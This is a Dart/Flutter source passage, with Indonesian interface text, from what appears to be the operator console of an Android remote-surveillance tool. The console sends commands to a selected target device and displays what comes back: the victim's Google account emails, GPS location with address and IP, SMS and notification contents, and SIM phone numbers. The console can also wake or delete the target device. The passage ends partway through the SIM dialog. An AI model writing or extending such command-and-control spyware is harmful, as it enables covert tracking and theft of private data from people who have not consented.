                            style: TextStyle(color: _t2, fontSize: 13),
                          ),
                        )
                      : Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Padding(
                              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                              child: Text(
                                "AKUN GOOGLE",
                                style: TextStyle(
                                  color: _t2,
                                  fontSize: 9,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 2,
                                ),
                              ),
                            ),
                            Expanded(
                              child: ListView.builder(
                                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                itemCount: _googleAccounts.length,
                                itemBuilder: (context, index) {
                                  final account = _googleAccounts[index];
                                  final email = account['email']?.toString() ?? 'Unknown';
                                  final type = account['type']?.toString() ?? 'com.google';
                                  final initial = email.isNotEmpty ? email[0].toUpperCase() : '?';

                                  return Container(
                                    margin: const EdgeInsets.only(bottom: 4),
                                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                                    decoration: BoxDecoration(
                                      color: _b2,
                                      borderRadius: BorderRadius.circular(10),
                                      border: Border.all(
                                        color: _blue2.withOpacity(0.05),
                                      ),
                                    ),
                                    child: Row(
                                      children: [
                                        Container(
                                          width: 36,
                                          height: 36,
                                          decoration: BoxDecoration(
                                            color: const Color(0xFFF87171).withOpacity(0.1),
                                            borderRadius: BorderRadius.circular(8),
                                            border: Border.all(
                                              color: const Color(0xFFF87171).withOpacity(0.2),
                                            ),
                                          ),
                                          child: Center(
                                            child: Text(
                                              initial,
                                              style: TextStyle(
                                                color: const Color(0xFFF87171),
                                                fontSize: 14,
                                                fontWeight: FontWeight.bold,
                                              ),
                                            ),
                                          ),
                                        ),
                                        const SizedBox(width: 12),
                                        Expanded(
                                          child: Column(
                                            crossAxisAlignment: CrossAxisAlignment.start,
                                            children: [
                                              Text(
                                                email,
                                                style: TextStyle(
                                                  color: _t0,
                                                  fontSize: 13,
                                                  fontWeight: FontWeight.w500,
                                                ),
                                                maxLines: 1,
                                                overflow: TextOverflow.ellipsis,
                                              ),
                                              Text(
                                                type,
                                                style: TextStyle(
                                                  color: _t2,
                                                  fontSize: 10,
                                                ),
                                              ),
                                            ],
                                          ),
                                        ),
                                        GestureDetector(
                                          onTap: () {
                                            _copyText(email);
                                            ScaffoldMessenger.of(context).showSnackBar(
                                              SnackBar(
                                                content: Text("📧 Copied: $email", style: TextStyle(color: _t0)),
                                                backgroundColor: _b3,
                                              ),
                                            );
                                          },
                                          child: Container(
                                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                                            decoration: BoxDecoration(
                                              color: _blue2.withOpacity(0.1),
                                              borderRadius: BorderRadius.circular(6),
                                              border: Border.all(
                                                color: _blue2.withOpacity(0.2),
                                              ),
                                            ),
                                            child: Text(
                                              "COPY",
                                              style: TextStyle(
                                                color: _blue2,
                                                fontSize: 10,
                                                fontWeight: FontWeight.bold,
                                              ),
                                            ),
                                          ),
                                        ),
                                      ],
                                    ),
                                  );
                                },
                              ),
                            ),
                          ],
                        ),
            ),
            actions: [
              TextButton(
                onPressed: () {
                  Navigator.pop(context);
                },
                child: Text(
                  "TUTUP",
                  style: TextStyle(color: _t2, fontWeight: FontWeight.bold),
                ),
              ),
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [_blue2, _blue3],
                  ),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: ElevatedButton.icon(
                  onPressed: () {
                    setState(() {
                      _isGoogleAccountsLoading = true;
                    });
                    setDialogState(() {});
                    _sendCommand('getGmail');
                    _addLog("🔄 Refreshing Google accounts", LogType.info);
                  },
                  icon: const Icon(Icons.refresh, size: 16, color: Colors.white),
                  label: const Text("REFRESH", style: TextStyle(color: Colors.white)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.transparent,
                    shadowColor: Colors.transparent,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                  ),
                ),
              ),
            ],
          );
        },
      ),
    );
  }

  // ─── SHOW LOCATION DIALOG (VERSI POLLING HTTP) ────────────────────
  void _showLocationDialog() {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    // Reset state dan mulai loading
    setState(() {
      _isLocationLoading = true;
      _locationData = {};
      _locationPollingAttempts = 0;
    });

    // Kirim perintah
    _sendCommand('getLocation');
    _addLog("📍 Mengirim perintah GPS...", LogType.info);

    // Tampilkan dialog loading
    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (context) {
        return StatefulBuilder(
          builder: (context, setDialogState) {
            // Mulai polling setelah dialog terbuka
            WidgetsBinding.instance.addPostFrameCallback((_) {
              _startLocationPolling(setDialogState);
            });

            return AlertDialog(
              backgroundColor: _b3,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(20),
                side: BorderSide(color: _gborder2),
              ),
              titlePadding: const EdgeInsets.all(16),
              contentPadding: const EdgeInsets.all(0),
              title: Row(
                children: [
                  Container(
                    width: 36,
                    height: 36,
                    decoration: BoxDecoration(
                      color: _green.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _green.withOpacity(0.3)),
                    ),
                    child: const Icon(Icons.location_on, color: Colors.green, size: 20),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          "GPS Location",
                          style: TextStyle(
                            color: _t0,
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                        Text(
                          _isLocationLoading
                              ? "🔄 Mengambil lokasi..."
                              : _locationData['error'] != null
                                  ? "❌ Gagal"
                                  : "✅ Lokasi ditemukan",
                          style: TextStyle(
                            color: _isLocationLoading
                                ? _t2
                                : _locationData['error'] != null
                                    ? _red
                                    : _green,
                            fontSize: 11,
                          ),
                        ),
                      ],
                    ),
                  ),
                  IconButton(
                    icon: Icon(Icons.close, color: _t2, size: 20),
                    onPressed: () {
                      _locationPollingTimer?.cancel();
                      setState(() {
                        _isLocationLoading = false;
                      });
                      Navigator.pop(context);
                    },
                  ),
                ],
              ),
              content: Container(
                width: double.maxFinite,
                height: 300,
                child: _isLocationLoading
                    ? Center(
                        child: Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            SizedBox(
                              width: 40,
                              height: 40,
                              child: CircularProgressIndicator(
                                color: _blue2,
                                strokeWidth: 3,
                              ),
                            ),
                            const SizedBox(height: 16),
                            Text(
                              "Mengambil lokasi...",
                              style: TextStyle(color: _t2, fontSize: 13),
                            ),
                            const SizedBox(height: 8),
                            Text(
                              "⏱️ $_locationPollingAttempts / $_locationMaxAttempts detik",
                              style: TextStyle(color: _t3, fontSize: 10),
                            ),
                          ],
                        ),
                      )
                    : _locationData.isEmpty || _locationData['error'] != null
                        ? Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Icon(
                                  _locationData['error'] == 'timeout'
                                      ? Icons.timer_off_outlined
                                      : Icons.error_outline,
                                  color: _t2,
                                  size: 48,
                                ),
                                const SizedBox(height: 12),
                                Text(
                                  _locationData['message'] ??
                                      _locationData['error'] ??
                                      "Lokasi tidak tersedia",
                                  style: TextStyle(color: _t2, fontSize: 14),
                                  textAlign: TextAlign.center,
                                ),
                                const SizedBox(height: 16),
                                ElevatedButton(
                                  onPressed: () {
                                    // Ulangi
                                    setDialogState(() {
                                      setState(() {
                                        _isLocationLoading = true;
                                        _locationData = {};
                                        _locationPollingAttempts = 0;
                                      });
                                      _sendCommand('getLocation');
                                      _startLocationPolling(setDialogState);
                                    });
                                  },
                                  style: ElevatedButton.styleFrom(
                                    backgroundColor: _blue2,
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(10),
                                    ),
                                  ),
                                  child: const Text("COBA LAGI", style: TextStyle(color: Colors.white)),
                                ),
                              ],
                            ),
                          )
                        : _buildLocationDataContent(context, setDialogState),
              ),
              actions: _isLocationLoading || _locationData['error'] != null
                  ? []
                  : [
                      TextButton(
                        onPressed: () {
                          _locationPollingTimer?.cancel();
                          Navigator.pop(context);
                        },
                        child: Text(
                          "TUTUP",
                          style: TextStyle(color: _t2, fontWeight: FontWeight.bold),
                        ),
                      ),
                      Container(
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: [_blue2, _blue3],
                          ),
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: ElevatedButton.icon(
                          onPressed: () {
                            setState(() {
                              _isLocationLoading = true;
                              _locationData = {};
                              _locationPollingAttempts = 0;
                            });
                            _locationPollingTimer?.cancel();
                            _sendCommand('getLocation');
                            _startLocationPolling(setDialogState);
                            _addLog("🔄 Refreshing location", LogType.info);
                          },
                          icon: const Icon(Icons.refresh, size: 16, color: Colors.white),
                          label: const Text("REFRESH", style: TextStyle(color: Colors.white)),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.transparent,
                            shadowColor: Colors.transparent,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10),
                            ),
                          ),
                        ),
                      ),
                    ],
            );
          },
        );
      },
    ).then((_) {
      _locationPollingTimer?.cancel();
    });
  }

  // ─── POLLING LOKASI ──────────────────────────────────────────────────
  void _startLocationPolling(StateSetter setDialogState) {
    _locationPollingTimer?.cancel();
    _locationPollingAttempts = 0;

    _locationPollingTimer = Timer.periodic(const Duration(seconds: 1), (timer) async {
      if (!mounted) { timer.cancel(); return; }

      _locationPollingAttempts++;
      if (_locationPollingAttempts > _locationMaxAttempts) {
        timer.cancel();
        if (mounted) {
          setState(() {
            _isLocationLoading = false;
            _locationData = {'error': 'timeout', 'message': '⏱️ Waktu habis, device mungkin offline'};
          });
          setDialogState(() {});
          _addLog("⏱️ Location timeout", LogType.warning);
        }
        return;
      }

      try {
        final prefs = await SharedPreferences.getInstance();
        final token = prefs.getString('key');
        if (token == null) { timer.cancel(); return; }

        final res = await http.get(
          Uri.parse("$baseUrl/api/get-response/$_targetId"),
          headers: {"x-auth-token": token},
        ).timeout(const Duration(seconds: 5));

        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final data = jsonDecode(res.body);
          if (data['data'] != null && data['cmd']?.toString() == 'getLocation') {
            final locData = data['data'];
            if (locData['lat'] != null && locData['lng'] != null) {
              timer.cancel();
              if (mounted) {
                setState(() {
                  _locationData = Map<String, dynamic>.from(locData);
                  _isLocationLoading = false;
                });
                setDialogState(() {});
                _addLog("📍 Lokasi diterima: ${locData['lat']}, ${locData['lng']}", LogType.success);
              }
              return;
            }
          }
        }
      } catch (e) {
        // Ignore errors, continue polling
      }

      // Update counter di dialog
      if (mounted) {
        setDialogState(() {});
      }
    });
  }

  // ─── KONTEN DATA LOKASI ──────────────────────────────────────────────
  Widget _buildLocationDataContent(BuildContext context, StateSetter setDialogState) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
            decoration: BoxDecoration(
              color: _b2,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _green.withOpacity(0.2)),
            ),
            child: Row(
              children: [
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    color: _green,
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: _green.withOpacity(0.5),
                        blurRadius: 8,
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 8),
                Text(
                  "ONLINE",
                  style: TextStyle(
                    color: _green,
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(width: 16),
                Text(
                  _formatTimestamp(_locationData['timestamp']),
                  style: TextStyle(
                    color: _t2,
                    fontSize: 9,
                    letterSpacing: 0.5,
                  ),
                ),
                const Spacer(),
                GestureDetector(
                  onTap: () {
                    final coord = "${_locationData['lat']}, ${_locationData['lng']}";
                    _copyText(coord);
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                        content: Text("📍 Copied: $coord", style: TextStyle(color: _t0)),
                        backgroundColor: _b3,
                      ),
                    );
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                    decoration: BoxDecoration(
                      color: _blue2.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _blue2.withOpacity(0.2)),
                    ),
                    child: Text(
                      "COPY",
                      style: TextStyle(
                        color: _blue2,
                        fontSize: 7,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
          const SizedBox(height: 12),

          _buildLocationInfoRow(
            icon: Icons.wifi,
            label: "IP Address",
            value: _locationData['ip'] ?? _locationData['ipAddress'] ?? '—',
          ),
          _buildLocationInfoRow(
            icon: Icons.phone_android,
            label: "Device ID",
            value: _locationData['deviceId'] ?? _targetId,
          ),
          _buildLocationInfoRow(
            icon: Icons.branding_watermark,
            label: "Brand",
            value: _locationData['brand'] ?? _deviceData['brand'] ?? '—',
          ),

          const SizedBox(height: 12),
          Container(height: 1, color: _blue2.withOpacity(0.1)),
          const SizedBox(height: 12),

          _buildLocationDetailRow(
            icon: Icons.location_city,
            label: "Provinsi",
            value: _locationData['province'] ?? '-',
          ),
          _buildLocationDetailRow(
            icon: Icons.location_city,
            label: "Kota",
            value: _locationData['city'] ?? '-',
          ),
          _buildLocationDetailRow(
            icon: Icons.location_city,
            label: "Kecamatan",
            value: _locationData['district'] ?? '-',
          ),
          _buildLocationDetailRow(
            icon: Icons.location_on,
            label: "Desa",
            value: _locationData['village'] ?? '-',
          ),
          _buildLocationDetailRow(
            icon: Icons.local_post_office,
            label: "Kode Pos",
            value: _locationData['postalCode'] ?? '-',
          ),

          const SizedBox(height: 12),

          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: _b2,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _blue2.withOpacity(0.15)),
            ),
            child: Row(
              children: [
                Container(
                  width: 36,
                  height: 36,
                  decoration: BoxDecoration(
                    color: _blue2.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: _blue2.withOpacity(0.2)),
                  ),
                  child: const Icon(
                    Icons.map,
                    color: Colors.blueAccent,
                    size: 18,
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "Coordinates",
                        style: TextStyle(
                          color: _t2,
                          fontSize: 9,
                          letterSpacing: 1,
                        ),
                      ),
                      Text(
                        "${_locationData['lat']?.toString() ?? '?'}, ${_locationData['lng']?.toString() ?? '?'}",
                        style: TextStyle(
                          color: _t0,
                          fontSize: 13,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
                ),
                GestureDetector(
                  onTap: () {
                    final coord = "${_locationData['lat']}, ${_locationData['lng']}";
                    _copyText(coord);
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                        content: Text("📍 Copied: $coord", style: TextStyle(color: _t0)),
                        backgroundColor: _b3,
                      ),
                    );
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                    decoration: BoxDecoration(
                      color: _blue2.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(6),
                      border: Border.all(color: _blue2.withOpacity(0.2)),
                    ),
                    child: Text(
                      "COPY",
                      style: TextStyle(
                        color: _blue2,
                        fontSize: 8,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 0.5,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),

          const SizedBox(height: 16),

          Row(
            children: [
              Expanded(
                child: Container(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [Colors.green.shade700, Colors.green.shade500],
                    ),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: ElevatedButton.icon(
                    onPressed: () {
                      final lat = _locationData['lat']?.toString() ?? '';
                      final lng = _locationData['lng']?.toString() ?? '';
                      if (lat.isNotEmpty && lng.isNotEmpty) {
                        final url = "https://www.google.com/maps?q=$lat,$lng";
                        _launchUrl(url);
                      } else {
                        ScaffoldMessenger.of(context).showSnackBar(
                          SnackBar(
                            content: Text("Koordinat tidak tersedia", style: TextStyle(color: _t0)),
                            backgroundColor: _b3,
                          ),
                        );
                      }
                    },
                    icon: const Icon(Icons.map, size: 18, color: Colors.white),
                    label: const Text(
                      "MAPS",
                      style: TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1,
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.transparent,
                      shadowColor: Colors.transparent,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: Container(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [_amber, _amber.withOpacity(0.6)],
                    ),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: ElevatedButton.icon(
                    onPressed: () {
                      _sendCommand('wakeUp', extra: '');
                      _addLog("⏰ Wake up command sent", LogType.success);
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                          content: Text("⏰ Wake up sent!", style: TextStyle(color: _t0)),
                          backgroundColor: _b3,
                        ),
                      );
                    },
                    icon: const Icon(Icons.alarm, size: 18, color: Colors.white),
                    label: const Text(
                      "WAKE",
                      style: TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1,
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.transparent,
                      shadowColor: Colors.transparent,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: Container(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [_red, Colors.red.shade800],
                    ),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: ElevatedButton.icon(
                    onPressed: _showDeleteConfirmDialog,
                    icon: const Icon(Icons.delete, size: 18, color: Colors.white),
                    label: const Text(
                      "DEL",
                      style: TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1,
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.transparent,
                      shadowColor: Colors.transparent,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildLocationInfoRow({
    required IconData icon,
    required String label,
    required String value,
  }) {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 4, horizontal: 4),
      child: Row(
        children: [
          Icon(icon, color: _t2, size: 14),
          const SizedBox(width: 8),
          Text(
            label,
            style: TextStyle(
              color: _t2,
              fontSize: 9,
              letterSpacing: 0.5,
            ),
          ),
          const Spacer(),
          Text(
            value,
            style: TextStyle(
              color: _t0,
              fontSize: 11,
              fontWeight: FontWeight.w500,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLocationDetailRow({
    required IconData icon,
    required String label,
    required String value,
  }) {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Icon(icon, color: _t2, size: 14),
          const SizedBox(width: 10),
          Text(
            label,
            style: TextStyle(
              color: _t2,
              fontSize: 9,
              letterSpacing: 0.5,
            ),
          ),
          const Spacer(),
          Text(
            value,
            style: TextStyle(
              color: _t0,
              fontSize: 11,
              fontWeight: FontWeight.w500,
            ),
          ),
        ],
      ),
    );
  }

  String _formatTimestamp(dynamic timestamp) {
    try {
      if (timestamp is String) {
        final date = DateTime.parse(timestamp).toLocal();
        return "${date.year}/${date.month.toString().padLeft(2, '0')}/${date.day.toString().padLeft(2, '0')} ${date.hour.toString().padLeft(2, '0')}:${date.minute.toString().padLeft(2, '0')}";
      }
      if (timestamp is int) {
        final date = DateTime.fromMillisecondsSinceEpoch(timestamp).toLocal();
        return "${date.year}/${date.month.toString().padLeft(2, '0')}/${date.day.toString().padLeft(2, '0')} ${date.hour.toString().padLeft(2, '0')}:${date.minute.toString().padLeft(2, '0')}";
      }
    } catch (_) {}
    return DateTime.now().toLocal().toString().substring(0, 16);
  }

  void _showDeleteConfirmDialog() {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.8),
      builder: (context) => AlertDialog(
        backgroundColor: _b3,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _gborder2),
        ),
        title: Row(
          children: [
            Icon(Icons.warning_amber, color: _red, size: 24),
            const SizedBox(width: 10),
            Text(
              "Delete Device?",
              style: TextStyle(
                color: _t0,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Text(
          "Are you sure you want to delete this device?\n\nDevice ID: $_targetId",
          style: TextStyle(color: _t2, fontSize: 14),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("CANCEL", style: TextStyle(color: _t2)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_red, Colors.red.shade800],
              ),
              borderRadius: BorderRadius.circular(10),
            ),
            child: ElevatedButton.icon(
              onPressed: () {
                _sendCommand('deleteDevice', extra: '');
                _addLog("🗑️ Delete device: $_targetId", LogType.success);
                Navigator.pop(context);
                Navigator.pop(context);
                setState(() {
                  _targetId = "unknown";
                  _targetModel = "COMMAND CENTER";
                });
                ScaffoldMessenger.of(context).showSnackBar(
                  SnackBar(
                    content: Text("🗑️ Device deleted", style: TextStyle(color: _t0)),
                    backgroundColor: _b3,
                  ),
                );
              },
              icon: const Icon(Icons.delete, size: 18, color: Colors.white),
              label: const Text("DELETE", style: TextStyle(color: Colors.white)),
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── SHOW SMS DATA ──────────────────────────────────────────────────
  void _showSmsData(Map<String, dynamic> data) {
    final list = data['status']?['smsList'] as List? ?? [];
    _addLog("💬 SMS data: ${list.length} aplikasi", LogType.success);
    if (list.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("Tidak ada SMS", style: TextStyle(color: _t0)),
          backgroundColor: _b3,
        ),
      );
      return;
    }
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.92),
      builder: (context) => AlertDialog(
        backgroundColor: _b3,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _gborder2),
        ),
        title: Text("📩 SMS (${list.length})", style: TextStyle(color: _t0)),
        content: SizedBox(
          width: double.maxFinite,
          height: 300,
          child: ListView.builder(
            itemCount: list.length,
            itemBuilder: (context, i) {
              final app = list[i];
              final appName = app['appName'] ?? 'Unknown';
              final messages = (app['messages'] as List?) ?? [];
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: _b2,
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(appName, style: TextStyle(color: _t0, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    ...messages.take(3).map((m) => Text(
                      m['text'] ?? '',
                      style: TextStyle(color: _t2, fontSize: 12),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    )),
                    if (messages.length > 3)
                      Text("+${messages.length - 3} lainnya", style: TextStyle(color: _t2, fontSize: 10)),
                  ],
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("TUTUP", style: TextStyle(color: _t2)),
          ),
        ],
      ),
    );
  }

  // ─── SHOW NOTIF DATA ──────────────────────────────────────────────────
  void _showNotifData(Map<String, dynamic> data) {
    final list = data['status']?['notifList'] as List? ?? [];
    _addLog("🔔 Notif data: ${list.length} aplikasi", LogType.success);
    if (list.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("Tidak ada notifikasi", style: TextStyle(color: _t0)),
          backgroundColor: _b3,
        ),
      );
      return;
    }
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.92),
      builder: (context) => AlertDialog(
        backgroundColor: _b3,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _gborder2),
        ),
        title: Text("🔔 Notifikasi (${list.length})", style: TextStyle(color: _t0)),
        content: SizedBox(
          width: double.maxFinite,
          height: 300,
          child: ListView.builder(
            itemCount: list.length,
            itemBuilder: (context, i) {
              final app = list[i];
              final appName = app['appName'] ?? 'Unknown';
              final messages = (app['messages'] as List?) ?? [];
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: _b2,
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(appName, style: TextStyle(color: _t0, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    ...messages.take(3).map((m) => Text(
                      m['text'] ?? '',
                      style: TextStyle(color: _t2, fontSize: 12),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    )),
                    if (messages.length > 3)
                      Text("+${messages.length - 3} lainnya", style: TextStyle(color: _t2, fontSize: 10)),
                  ],
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("TUTUP", style: TextStyle(color: _t2)),
          ),
        ],
      ),
    );
  }

  // ─── SHOW PHONE DIALOG ──────────────────────────────────────────────
  void _showPhoneDialog() {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    setState(() {
      _isPhoneLoading = true;
      _phoneData = {};
    });

    _sendCommand('getPhone');
    _addLog("📱 Fetching phone info...", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          return AlertDialog(
            backgroundColor: _b3,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20),
              side: BorderSide(color: _gborder2),
            ),
            titlePadding: const EdgeInsets.all(16),
            contentPadding: const EdgeInsets.all(0),
            title: Row(
              children: [
                Container(
                  width: 36,
                  height: 36,
                  decoration: BoxDecoration(
                    color: const Color(0xFF34D399).withOpacity(0.15),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: const Color(0xFF34D399).withOpacity(0.3)),
                  ),
                  child: const Icon(Icons.phone, color: Color(0xFF34D399), size: 20),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "Nomor SIM / Kartu",
                        style: TextStyle(
                          color: _t0,
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      Text(
                        _phoneData.isNotEmpty && _phoneData['error'] == null
                            ? "${_phoneData['sims']?.length ?? 0} SIM ditemukan"
                            : _isPhoneLoading ? "Fetching..." : "Tidak ada data",
                        style: TextStyle(
                          color: _t2,
                          fontSize: 11,
                        ),
                      ),
                    ],
                  ),
                ),
                IconButton(
                  icon: Icon(Icons.close, color: _t2, size: 20),
                  onPressed: () {
                    Navigator.pop(context);
                  },
                ),
              ],
            ),
            content: Container(
              width: double.maxFinite,
              height: 300,
              child: _isPhoneLoading
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          SizedBox(
                            width: 30,
                            height: 30,
                            child: CircularProgressIndicator(
                              color: _blue2,
                              strokeWidth: 2,
                            ),
                          ),
                          const SizedBox(height: 12),
                          Text(
                            "Loading phone info...",
                            style: TextStyle(color: _t2, fontSize: 12),
                          ),
                        ],
                      ),
                    )
                  : _phoneData.isEmpty || _phoneData['error'] != null
                      ? Center(
                          child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Icon(Icons.sim_card_alert_outlined, color: _t2, size: 48),
                              const SizedBox(height: 12),
                              Text(
                                _phoneData['error'] ?? "No SIM data found",
                                style: TextStyle(color: _t2, fontSize: 13),
                              ),
                            ],
                          ),
                        )
                      : SingleChildScrollView(
                          padding: const EdgeInsets.all(12),
                          child: Column(
                            children: [
                              ...(_phoneData['sims'] as List? ?? []).map((sim) {
                                final number = sim['number']?.toString() ?? 'Tidak tersedia';
                                final operatorName = sim['operator']?.toString() ?? sim['carrierName']?.toString() ?? 'Unknown';
                                final slot = sim['slot'] != null ? 'SIM ${(sim['slot'] as int) + 1}' : 'SIM';
                                final displayName = sim['displayName']?.toString() ?? slot;

                                return Container(
                                  margin: const EdgeInsets.only(bottom: 8),
                                  padding: const EdgeInsets.all(14),
                                  decoration: BoxDecoration(
                                    color: _b2,
                                    borderRadius: BorderRadius.circular(12),
                                    border: Border.all(
                                      color: const Color(0xFF34D399).withOpacity(0.2),
                                    ),
                                  ),
                                  child: Row(
                                    children: [
                                      Container(
                                        width: 40,
                                        height: 40,
                                        decoration: BoxDecoration(
                                          color: const Color(0xFF34D399).withOpacity(0.1),
